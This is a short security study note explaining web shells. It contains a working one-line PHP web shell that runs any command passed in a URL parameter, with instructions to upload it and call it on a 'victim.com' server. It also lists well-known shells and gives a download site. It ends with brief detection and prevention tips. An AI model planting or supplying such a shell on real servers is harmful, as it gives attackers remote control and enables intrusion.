# 🌐 Web Shells

## 📋 Purpose

A **web shell** is a malicious script uploaded to a compromised web server to execute commands remotely. It’s often hidden within web applications, making it hard to detect, and is used for unauthorized access, file management, or command execution.

## 🔍 Key Features

- **Languages**: Written in server-supported languages (e.g., PHP, ASP, JSP, CGI).
- **Access**: Executed via a URL with parameters (e.g., `http://victim.com/shell.php?cmd=whoami`).
- **Vulnerabilities Exploited**: Unrestricted File Upload, File Inclusion, Command Injection, or unauthorized server access.

## 🚀 Example PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

- **File**: Save as `shell.php` and upload to the server.
- **Usage**: Access via URL, e.g., `http://victim.com/uploads/shell.php?cmd=whoami`.
- **Function**: Executes commands (e.g., `whoami`) and displays output in the browser.

## 🛠 Popular Web Shells

|Name|Description|
|---|---|
|**p0wny-shell**|Minimalistic single-file PHP web shell for remote command execution.|
|**b374k shell**|Feature-rich PHP web shell with file management and command execution.|
|**c99 shell**|Robust PHP web shell with extensive functionality.|

- **Source**: More web shells available at [r57shell.net](https://www.r57shell.net/).

## ✅ Quick Notes

- **Vulnerability**: Unrestricted File Upload allows attackers to upload malicious scripts by failing to restrict file types.
- **Definition**: A web shell is a malicious script uploaded to a vulnerable web application to gain unauthorized access.
- **Detection**: Hard to detect due to blending with legitimate web content.
- **Prevention**: Validate file uploads, restrict server-side scripting, and monitor server logs.